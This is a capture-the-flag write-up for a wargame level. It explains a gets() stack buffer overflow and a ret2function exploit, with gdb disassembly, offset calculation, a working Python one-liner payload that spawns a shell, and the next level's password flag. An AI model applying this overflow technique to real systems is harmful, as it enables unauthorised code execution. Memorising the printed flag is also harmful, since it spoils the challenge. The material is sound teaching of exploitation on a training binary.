# Level 1

This binary reads a line of text from you and does nothing else useful. No password check, no menu. So how do we turn "reads a line of text" into a shell? We make the program run code it was never meant to run.

> **The core idea**
>
> Think of a function call like leaving your coat at a coat check. When you hand over your coat, you get a ticket that says "come back to counter 76 when you're done." The program keeps a similar ticket on the stack: a **return address** that says where to continue once the current function finishes.
>
> The bug here lets us scribble over that ticket. Instead of "go back to where you came from," we write "go to the function that opens a shell." The program follows our forged ticket without question.

## Analysis

Let's look at what `main` actually does:

```
(gdb) disas main
   0x08048486 <+6>:     sub    $0x50,%esp        ; reserve 80 bytes on the stack
   0x08048489 <+9>:     lea    0x10(%esp),%eax   ; buffer starts at esp+0x10
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   <gets@plt>        ; read a line into the buffer
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret                       ; jump to the return address
```

That's the whole program: it reads a line with `gets()` into a stack buffer, then returns.

The problem is `gets()`. It reads until you hit Enter, with no idea how big the buffer is. If you type more than fits, it keeps writing anyway, spilling past the buffer and over whatever sits next to it on the stack, including that return-address ticket. This is a classic [buffer overflow](../knowledge_base/buffer_overflow_101.md).

Now we need somewhere worth jumping to. Let's list the functions:

```
(gdb) info functions
0x08048444  run
```

There's a `run` function, and `main` never calls it. Dead code. Let's see what it does:

```
(gdb) disas run
call   <fwrite@plt>
call   <system@plt>    ; runs system("/bin/sh")
```

It opens a shell. That's our destination.

> **Why jump to existing code instead of injecting our own?**
>
> This trick is called [ret2function](../knowledge_base/ret2libc.md#ret2libc-vs-ret2function): point the return address at code that's already in the binary. We don't have to smuggle in our own instructions, we just reuse a door the program already has. It even works when defenses like NX are on (we run real program code, not data we typed) and it needs a fixed address, which we have here because ASLR is off.

## Exploit

The plan: fill the buffer with junk until we reach the return-address ticket, then overwrite the ticket with the address of `run`.

### Step 1: find the offset

First we need the exact distance from the start of the buffer to the return address. Count it from the disassembly:

```
bytes  0..63   the buffer itself (64 bytes)
bytes 64..75   saved EBP + stack-alignment padding (12 bytes)
bytes 76..79   the saved return address   <- this is what we want to overwrite
```

So the return address sits at offset **76**. Let's not just trust the math, let's prove it. We send 76 junk bytes, then 4 easy-to-spot marker bytes `BBBB`, and see where the program crashes:

```
(gdb) run < <(python -c "print('A' * 76 + 'BBBB')")
Program received signal SIGSEGV
0x42424242 in ?? ()
```

`0x42` is the hex code for the letter `B`. The program tried to jump to `0x42424242`, which is our `BBBB`. That means our 4 marker bytes landed exactly on the return address. Offset 76 confirmed.

> **Why exactly 76, not close-enough?**
>
> The 4 bytes we control have to sit precisely on the return address.
> - Too few (say 70): `BBBB` stops short, the real return address stays intact, and the program returns normally. No control.
> - Too many (say 80): the return address fills with `A`s and `BBBB` overshoots past it. The program jumps to `0x41414141` (`AAAA`) instead.
>
> Only offset 76 puts our 4 bytes on target.

### Step 2: get the target address

```
(gdb) p run
$1 = 0x8048444 <run>
```

The x86 architecture stores addresses least-significant byte first ("little-endian"), so we write the bytes in reverse: `\x44\x84\x04\x08`.

### Step 3: fire

```bash
$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

The `; cat` at the end keeps stdin open. Without it, the shell we just spawned would get an instant end-of-input and close before we could type anything.

Flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
